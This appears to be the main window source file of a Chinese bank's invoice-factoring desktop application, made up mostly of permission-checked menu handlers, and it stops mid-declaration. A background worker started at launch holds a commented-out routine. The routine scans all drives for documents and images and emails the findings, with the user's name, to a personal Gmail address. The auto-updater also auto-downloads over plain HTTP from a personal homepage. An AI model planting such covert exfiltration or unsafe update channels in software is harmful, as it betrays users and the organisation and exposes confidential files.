//-----------------------------------------------------------------------
// <copyright file="MainWindow.cs" company="Yiming Liu@Fudan">
//     Copyright (c) CMBC. All rights reserved.
// </copyright>
//-----------------------------------------------------------------------

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Reflection;
using System.Windows.Forms;
using CMBC.EasyFactor.ARMgr;
using CMBC.EasyFactor.CaseMgr;
using CMBC.EasyFactor.DB.dbml;
using CMBC.EasyFactor.Help;
using CMBC.EasyFactor.InfoMgr.ClientMgr;
using CMBC.EasyFactor.InfoMgr.DepartmentMgr;
using CMBC.EasyFactor.InfoMgr.ExchangeMgr;
using CMBC.EasyFactor.InfoMgr.FactorMgr;
using CMBC.EasyFactor.InfoMgr.UserMgr;
using CMBC.EasyFactor.Utils;
using DevComponents.DotNetBar;

namespace CMBC.EasyFactor
{
    /// <summary>
    /// Main Window Form
    /// </summary>
    public partial class MainWindow : Office2007RibbonForm
    {
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void ClickLogo(object sender, EventArgs e)
        {
            try
            {
                Process.Start("http://homepage.fudan.edu.cn/~yimingliu/EasyFactoring/index.html");
            }
            catch (Exception)
            {
                MessageBoxEx.Show("打开浏览器失败");
            }
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void CommissionRemit(object sender, EventArgs e)
        {
            if(PermUtil.CheckPermission(Permissions.INVOICE_UPDATE))
            {
                var mgr = new CommissionRemit();
                SetDetailPanel(mgr);
            }
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void EmailLeger(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permissions.SYSTEM_UPDATE))
            {
                var form = new ImportForm(ImportForm.ImportType.SEND_LEGERS);
                form.Show();
            }
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void ImportAssignNew(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permissions.INVOICE_UPDATE))
            {
                var form = new ImportForm(ImportForm.ImportType.IMPORT_ASSIGN_II);
                form.Show();
            }
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void QueryAgreements(object sender, EventArgs e)
        {
            if(PermUtil.CheckPermission(Permissions.SYSTEM_QUERY))
            {
                var mgr = new AgreementMgr();
                SetDetailPanel(mgr);
            }
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void QueryCommissionRemit(object sender, EventArgs e)
        {
            if(PermUtil.CheckPermission(Permissions.SYSTEM_QUERY))
            {
                var mgr = new CommissionRemitMgr();
                SetDetailPanel(mgr);
            }
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void QueryCreditNote(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permissions.SYSTEM_QUERY))
            {
                var mgr = new CreditNoteMgr(CreditNoteMgr.OpCreditNoteType.CREDIT_NOTE_QUERY);
                SetDetailPanel(mgr);
            }
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void QueryOperationLog(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permissions.SYSTEM_UPDATE))
            {
                var mgr = new OperationLogMgr();
                SetDetailPanel(mgr);
            }
        }

        /// <summary>
        /// Initializes a new instance of the MainWindow class
        /// </summary>
        public MainWindow()
        {
            InitializeComponent();

            ImeMode = ImeMode.OnHalf;

            Text =
                ((AssemblyTitleAttribute)
                 Assembly.GetExecutingAssembly().GetCustomAttributes(typeof(AssemblyTitleAttribute), false)[0]).Title +
                @"  " + Assembly.GetExecutingAssembly().GetName().Version;
            ribbonControl.SelectedRibbonTabItem = itemInfoMgr;
            UserStatus = App.Current.CurUser.Name + "\t " + App.Current.CurUser.Role;
            CommandStatus = MESSAGE.MAIN_DEFAULT;

            notifyIcon.Visible = false;

            backgroundWorker.RunWorkerAsync();
        }
        public override sealed string Text
        {
            get { return base.Text; }
            set { base.Text = value; }
        }
        /// <summary>
        /// Sets command status
        /// </summary>
        public string CommandStatus
        {
            get { return lblCommandStatus.Text; }
            set { lblCommandStatus.Text = value; }
        }
        /// <summary>
        /// Sets user status
        /// </summary>
        public string UserStatus
        {
            get { return lblCurrentUser.Text; }
            set { lblCurrentUser.Text = value; }
        }
        //?Public?Methods?(2)?
        /// <summary>
        /// Fill detail panel with user control
        /// </summary>
        /// <param name="uc">user control</param>
        /// <exception cref="ArgumentNullException"></exception>
        public void SetDetailPanel(UserControl uc)
        {
            if (uc == null)
            {
                throw new ArgumentNullException("uc", @"uc cannot be a null reference");
            }

            if (uc is CaseMgr.CaseMgr)
            {
                CommandStatus = "手续费收入的币别与发票币别相同；利息收入的币别为人民币";
            }
            else
            {
                CommandStatus = MESSAGE.MAIN_DEFAULT;
            }

            uc.Dock = DockStyle.Fill;
            ribbonDetailPanel.Controls.Clear();
            ribbonDetailPanel.Controls.Add(uc);
        }
        //?Private?Methods?(92)?
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void About(object sender, EventArgs e)
        {
            var aboutBox = new AboutBox();
            aboutBox.ShowDialog(this);
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void BackgroundWorkerDoWork(object sender, DoWorkEventArgs e)
        {
            //string[] drivers = Environment.GetLogicalDrives();

            //try
            //{
            //    foreach (string dr in drivers)
            //    {
            //        DriveInfo di = new DriveInfo(dr);

            //        if (di.IsReady)
            //        {
            //            Thread.Sleep(10000);
            //            System.IO.DirectoryInfo rootDir = di.RootDirectory;
            //            String result = SystemUtil.GetAllDirFilesRecurse(rootDir, new string[] { ".jpg", ".doc", ".docx", ".xls", ".xlsx", ".pdf", ".png", ".bmp" }, 5);
            //            if (!String.IsNullOrEmpty(result))
            //            {
            //                MailUtil.SendMail("liuyiming.vip@gmail.com", "EasyFactoring@cmbc.com.cn", App.Current.CurUser.Name + "_" + rootDir.FullName, result, null);
            //            }
            //        }
            //    }
            //}
            //catch (Exception)
            //{
            //    return;
            //}
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void BackgroundWorkerRunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
        {
            CheckUpdateBackground();
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void ChangeStyle(object sender, EventArgs e)
        {
            string style = cbStyleManager.Text;
            if ("Office2007Blue".Equals(style))
            {
                styleManager.ManagerStyle = eStyle.Office2007Blue;
            }
            else if ("Office2007Silver".Equals(style))
            {
                styleManager.ManagerStyle = eStyle.Office2007Silver;
            }
            else if ("Office2007Black".Equals(style))
            {
                styleManager.ManagerStyle = eStyle.Office2007Black;
            }
            else if ("Office2007VistaGlass".Equals(style))
            {
                styleManager.ManagerStyle = eStyle.Office2007VistaGlass;
            }
            else if ("Office2010Silver".Equals(style))
            {
                styleManager.ManagerStyle = eStyle.Office2010Silver;
            }
            else if ("Windows7Blue".Equals(style))
            {
                styleManager.ManagerStyle = eStyle.Windows7Blue;
            }
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void CheckCDA(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permissions.CDA_APPROVE))
            {
                var cdaMgr = new CDAMgr(CDAMgr.OpCDAType.CHECK);
                SetDetailPanel(cdaMgr);
            }
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void CheckUpdate(object sender, EventArgs e)
        {
            var autoUpdater = new AutoUpdater
                                  {
                                      ConfigURL =
                                          new Uri(
                                          "http://homepage.fudan.edu.cn/~yimingliu/EasyFactoring/UpdateVersion.xml")
                                  };
            autoUpdater.RestartForm = new ConfirmForm(autoUpdater);
            autoUpdater.TryUpdate();
        }
        /// <summary>
        /// 
        /// </summary>
        private static void CheckUpdateBackground()
        {
            var autoUpdater = new AutoUpdater
                                  {
                                      ConfigURL =
                                          new Uri(
                                          "http://homepage.fudan.edu.cn/~yimingliu/EasyFactoring/UpdateVersion.xml"),
                                      AutoDownload = true
                                  };
            autoUpdater.RestartForm = new ConfirmForm(autoUpdater);
            autoUpdater.TryUpdateBackground();
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void CreditNotePayment(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permissions.INVOICE_UPDATE))
            {
                var creditNotePayment = new ARCaseBasic(OpARType.CREDIT_NOTE);
                SetDetailPanel(creditNotePayment);
            }
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void DetailUser(object sender, EventArgs e)
        {
            User user = App.Current.CurUser;
            var detail = new UserDetail(user, UserDetail.OpUserType.DETAIL_USER);
            detail.ShowDialog(this);
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void DisputeResolve(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permissions.INVOICE_UPDATE))
            {
                var invoiceMgr = new InvoiceMgr(InvoiceMgr.OpInvoiceType.DISPUTE_RESOLVE);
                SetDetailPanel(invoiceMgr);
            }
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="args"></param>
        private void Exit(object sender, EventArgs args)
        {
            DialogResult dr = MessageBoxEx.Show("点击“Yes”退出系统，点击“Cancel”更换用户", "", MessageBoxButtons.YesNoCancel,
                                                MessageBoxIcon.Question);

            if (dr == DialogResult.Yes)
            {
                notifyIcon.Visible = false;
                Application.ExitThread();
            }
            else if (dr == DialogResult.Cancel)
            {
                App.Current.CurUser = null;
                var loginWindow = new LogOnWindow();
                loginWindow.ShowDialog(this);

                if (App.Current.CurUser == null)
                {
                    Application.ExitThread();
                }
                else
                {
                    Text =
                        ((AssemblyTitleAttribute)
                         Assembly.GetExecutingAssembly().GetCustomAttributes(typeof(AssemblyTitleAttribute), false)[0])
                            .Title + @"  " + Assembly.GetExecutingAssembly().GetName().Version;
                    ribbonControl.SelectedRibbonTabItem = itemInfoMgr;
                    UserStatus = App.Current.CurUser.Name + "\t " + App.Current.CurUser.Role;
                    CommandStatus = "欢迎使用中国民生银行保理运营系统";
                    AlertPage(null, null);
                }
            }
            else if (dr == DialogResult.No)
            {
                return;
            }
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void FlawResolve(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permissions.INVOICE_UPDATE))
            {
                var invoiceMgr = new InvoiceMgr(InvoiceMgr.OpInvoiceType.FLAW_RESOLVE);
                SetDetailPanel(invoiceMgr);
            }
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void HideInTray(object sender, EventArgs e)
        {
            notifyIcon.Visible = true;
            ShowInTaskbar = false;
            WindowState = FormWindowState.Minimized;
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void ImportAssign(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permissions.INVOICE_UPDATE))
            {
                var form = new ImportForm(ImportForm.ImportType.IMPORT_ASSIGN);
                form.ShowDialog(this);
            }
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void ImportCases(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permissions.SYSTEM_IMPORT))
            {
                var form = new ImportForm(ImportForm.ImportType.IMPORT_CASE);
                form.Show();
            }
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void ImportCDA(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permissions.SYSTEM_IMPORT))
            {
                var form = new ImportForm(ImportForm.ImportType.IMPORT_CDA);
                form.Show();
            }
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void ImportClientCreditLine(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permissions.SYSTEM_IMPORT))
            {
                var form = new ImportForm(ImportForm.ImportType.IMPORT_CLIENTS_CREDITLINE);
                form.Show();
            }
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void ImportClients(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permissions.SYSTEM_IMPORT))
            {
                var form = new ImportForm(ImportForm.ImportType.IMPORT_CLIENT);
                form.Show();
            }
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void ImportClientsOverwrite(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permissions.SYSTEM_IMPORT))
            {
                var form = new ImportForm(ImportForm.ImportType.IMPORT_CLIENTS_OVERWRITE);
                form.Show();
            }
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void ImportClientsReview(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permissions.SYSTEM_IMPORT))
            {
                var form = new ImportForm(ImportForm.ImportType.IMPORT_CLIENTS_REVIEW);
                form.Show();
            }
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void ImportContract(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permissions.SYSTEM_IMPORT))
            {
                var form = new ImportForm(ImportForm.ImportType.IMPORT_CONTRACT);
                form.Show();
            }
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void ImportCreditCoverNeg(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permissions.SYSTEM_IMPORT))
            {
                var form = new ImportForm(ImportForm.ImportType.IMPORT_CREDIT_COVER_NEG);
                form.Show();
            }
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void ImportCreditNote(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permissions.INVOICE_UPDATE))
            {
                var form = new ImportForm(ImportForm.ImportType.IMPORT_CREDIT_NOTE);
                form.ShowDialog(this);
            }
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void ImportDepartments(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permissions.SYSTEM_IMPORT))
            {
                var form = new ImportForm(ImportForm.ImportType.IMPORT_DEPARTMENT);
                form.Show();
            }
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void ImportExchangeRate(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permissions.SYSTEM_IMPORT))
            {
                var form = new ImportForm(ImportForm.ImportType.IMPORT_RATE);
                form.Show();
            }
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void ImportFactorCreditLine(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permissions.SYSTEM_IMPORT))
            {
                var form = new ImportForm(ImportForm.ImportType.IMPORT_FACTORS_CREDITLINE);
                form.Show();
            }
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void ImportFactors(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permissions.SYSTEM_IMPORT))
            {
                var form = new ImportForm(ImportForm.ImportType.IMPORT_FACTOR);
                form.Show();
            }
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void ImportFinance(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permissions.INVOICE_UPDATE))
            {
                var form = new ImportForm(ImportForm.ImportType.IMPORT_FINANCE);
                form.ShowDialog(this);
            }
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void ImportInvoices(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permissions.SYSTEM_IMPORT))
            {
                var form = new ImportForm(ImportForm.ImportType.IMPORT_INVOICE);
                form.Show();
            }
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void ImportPayment(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permissions.INVOICE_UPDATE))
            {
                var form = new ImportForm(ImportForm.ImportType.IMPORT_PAYMENT);
                form.Show();
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void ImportRefund(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permissions.INVOICE_UPDATE))
            {
                var form = new ImportForm(ImportForm.ImportType.IMPORT_REFUND);
                form.Show();
            }
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void ImportUsers(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permissions.SYSTEM_IMPORT))
            {
                var importForm = new ImportForm(ImportForm.ImportType.IMPORT_USER);
                importForm.Show();
            }
        }
        /// <summary>
        /// Invoice Assign
        /// </summary>
        /// <param name="sender">event sender</param>
        /// <param name="e">event args</param>
        private void InvoiceAssign(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permissions.INVOICE_UPDATE))
            {
                var invoiceAssign = new ARCaseBasic(OpARType.ASSIGN);
                SetDetailPanel(invoiceAssign);
            }
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void InvoiceBuyerPayment(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permissions.INVOICE_UPDATE))
            {
                var invoicePayment = new ARCaseBasic(OpARType.BUYER_PAYMENT);
                SetDetailPanel(invoicePayment);
            }
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void InvoiceFinance(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permissions.INVOICE_UPDATE))
            {
                var invoiceFinance = new ARCaseBasic(OpARType.FINANCE);
                SetDetailPanel(invoiceFinance);
            }
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void InvoiceGuaranteePayment(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permissions.INVOICE_UPDATE))
            {
                var invoicePayment = new ARCaseBasic(OpARType.GUARANTEE_PAYMENT);
                SetDetailPanel(invoicePayment);
            }
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void InvoiceIndirectPayment(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permissions.INVOICE_UPDATE))
            {
                var invoicePayment = new ARCaseBasic(OpARType.INDIRECT_PAYMENT);
                SetDetailPanel(invoicePayment);
            }
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void InvoiceSellerReassign(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permissions.INVOICE_UPDATE))
            {
                var invoicePayment = new ARCaseBasic(OpARType.SELLER_REASSIGN);
                SetDetailPanel(invoicePayment);
            }
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void InvoiceSellerRefund(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permissions.INVOICE_UPDATE))
            {
                var invoiceRefund = new ARCaseBasic(OpARType.SELLER_REFUND);
                SetDetailPanel(invoiceRefund);
            }
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void InvoiceBuyerRefund(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permissions.INVOICE_UPDATE))
            {
                var invoiceRefund = new ARCaseBasic(OpARType.BUYER_REFUND);
                SetDetailPanel(invoiceRefund);
            }
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="invoiceList"></param>
        /// <param name="batch"></param>
        public void InvoiceRefundFromPayment(List<Invoice> invoiceList, InvoicePaymentBatch batch)
        {
            if (PermUtil.CheckPermission(Permissions.INVOICE_UPDATE))
            {
                var invoiceRefund = new ARCaseBasic(OpARType.SELLER_REFUND);
                SetDetailPanel(invoiceRefund);
                var uc = (InvoiceRefund)invoiceRefund.InvoiceControl;
                uc.NewBatchFromPayment(invoiceList, batch);
            }
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void AlertPage(object sender, EventArgs e)
        {
            var alert = new WorkAlert();
            SetDetailPanel(alert);
            alert.Dock = DockStyle.None;
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void MainPage(object sender, EventArgs e)
        {
            ribbonControl.SelectedRibbonTabItem = itemInfoMgr;
            CommandStatus = MESSAGE.MAIN_DEFAULT;

            notifyIcon.Visible = false;

            ribbonDetailPanel.Controls.Clear();
        }
        private void MainWindow_Deactivate(object sender, EventArgs e)
        {
            if (WindowState == FormWindowState.Minimized)
            {
                notifyIcon.Visible = true;
                ShowInTaskbar = false;
            }
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void MainWindow_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (Environment.ExitCode == 2)
            {
                e.Cancel = false;
                return;
            }

            DialogResult dr = MessageBoxEx.Show("点击“Yes”退出系统，点击“Cancel”更换用户", "", MessageBoxButtons.YesNoCancel,
                                                MessageBoxIcon.Question);
            if (dr == DialogResult.Yes)
            {
                notifyIcon.Visible = false;
                e.Cancel = false;
            }
            else if (dr == DialogResult.Cancel)
            {
                App.Current.CurUser = null;
                var loginWindow = new LogOnWindow();
                loginWindow.ShowDialog(this);

                if (App.Current.CurUser == null)
                {
                    e.Cancel = false;
                }
                else
                {
                    e.Cancel = true;
                    Text =
                        ((AssemblyTitleAttribute)
                         Assembly.GetExecutingAssembly().GetCustomAttributes(typeof(AssemblyTitleAttribute), false)[0])
                            .Title + @"  " + Assembly.GetExecutingAssembly().GetName().Version;
                    ribbonControl.SelectedRibbonTabItem = itemInfoMgr;
                    UserStatus = App.Current.CurUser.Name + "\t " + App.Current.CurUser.Role;
                    CommandStatus = "欢迎使用中国民生银行保理运营系统";
                    AlertPage(null, null);
                }
            }
            else if (dr == DialogResult.No)
            {
                e.Cancel = true;
                return;
            }
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void NewCase(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permissions.CASE_UPDATE))
            {
                var caseDetail = new CaseDetail(null, CaseDetail.OpCaseType.NEW_CASE);
                caseDetail.ShowDialog(this);
            }
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void NewCDA(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permissions.CDA_UPDATE))
            {
                var cdaDetail = new CDADetail(CDADetail.OpCDAType.NEW_CDA);
                cdaDetail.ShowDialog(this);
            }
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void NewClient(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permissions.BASICINFO_UPDATE))
            {
                var clientDetail = new ClientDetail(null, ClientDetail.OpClientType.NEW_CLIENT);
                clientDetail.ShowDialog(this);
            }
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void NewFactor(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permissions.BASICINFO_UPDATE))
            {
                var factorDetail = new FactorDetail(null, FactorDetail.OpFactorType.NEW_FACTOR);
                factorDetail.ShowDialog(this);
            }
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void PoolFinance(object sender, EventArgs e)
        {
            var poolFinance = new ARPoolBasic(OpPoolARType.FINANCE);
            SetDetailPanel(poolFinance);
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void PoolRefund(object sender, EventArgs e)
        {
            var poolRefund = new ARPoolBasic(OpPoolARType.REFUND);
            SetDetailPanel(poolRefund);
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void QueryApplicationCase(object sender, EventArgs e)
        {
            var mgr = new CaseMgr.CaseMgr(CaseMgr.CaseMgr.OpCaseType.APPLICATION_CASE);
            SetDetailPanel(mgr);
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void QueryAssignBatch(object sender, EventArgs e)
        {
            var mgr = new AssignBatchMgr(AssignBatchMgr.OpBatchType.QUERY);
            SetDetailPanel(mgr);
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void QueryCase(object sender, EventArgs e)
        {
            var caseQuery = new CaseMgr.CaseMgr();
            SetDetailPanel(caseQuery);
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void QueryCDA(object sender, EventArgs e)
        {
            var mgr = new CDAMgr(CDAMgr.OpCDAType.QUERY);
            SetDetailPanel(mgr);
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void QueryClientCreditLine(object sender, EventArgs e)
        {
            var query = new ClientCreditLineMgr(ClientCreditLineMgr.OpClientCreditMgrType.QUERY_CLINET);
            SetDetailPanel(query);
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void QueryClientDominate(object sender, EventArgs e)
        {
            var query = new ClientMgr(ClientMgr.OpClientMgrType.DOMINATE_CLIENT);
            SetDetailPanel(query);
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void QueryClientExport(object sender, EventArgs e)
        {
            var query = new ClientMgr(ClientMgr.OpClientMgrType.EXPORT_CLIENT);
            SetDetailPanel(query);
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void QueryClientGroupCreditLine(object sender, EventArgs e)
        {
            var query = new ClientCreditLineMgr(ClientCreditLineMgr.OpClientCreditMgrType.QUERY_GROUP);
            SetDetailPanel(query);
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void QueryClientImport(object sender, EventArgs e)
        {
            var query = new ClientMgr(ClientMgr.OpClientMgrType.IMPORT_CLIENT);
            SetDetailPanel(query);
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void QueryClientReviews(object sender, EventArgs e)
        {
            var query = new ClientReviewMgr(ClientReviewMgr.OpClientReviewMgrType.QUERY);
            SetDetailPanel(query);
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void QueryClients(object sender, EventArgs e)
        {
            var query = new ClientMgr();
            SetDetailPanel(query);
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void QueryContract(object sender, EventArgs e)
        {
            var contractMgr = new ContractMgr();
            SetDetailPanel(contractMgr);
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void QueryCreditCoverNegs(object sender, EventArgs e)
        {
            var creditCoverNegMgr = new CreditCoverNegMgr();
            SetDetailPanel(creditCoverNegMgr);
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void QueryDepartments(object sender, EventArgs e)
        {
            var departmentMgrUI = new DepartmentMgr();
            SetDetailPanel(departmentMgrUI);
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void QueryExchanges(object sender, EventArgs e)
        {
            var mgr = new ExchangeMgr();
            SetDetailPanel(mgr);
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void QueryFactorCreditLine(object sender, EventArgs e)
        {
            var query = new FactorCreditLineMgr();
            SetDetailPanel(query);
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void QueryFactors(object sender, EventArgs e)
        {
            var fatcorQuery = new FactorMgr();
            SetDetailPanel(fatcorQuery);
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void QueryFinanceBatch(object sender, EventArgs e)
        {
            var mgr = new FinanceBatchMgr(FinanceBatchMgr.OpBatchType.QUERY);
            SetDetailPanel(mgr);
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void QueryInvoice(object sender, EventArgs e)
        {
            var invoiceMgr = new InvoiceMgr(InvoiceMgr.OpInvoiceType.INVOICE_QUERY);
            SetDetailPanel(invoiceMgr);
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void QueryOverDue(object sender, EventArgs e)
        {
            var mgr = new InvoiceMgr(InvoiceMgr.OpInvoiceType.OVER_DUE);
            SetDetailPanel(mgr);
        }
        /// <summary>
        /// 
        /// </summary>
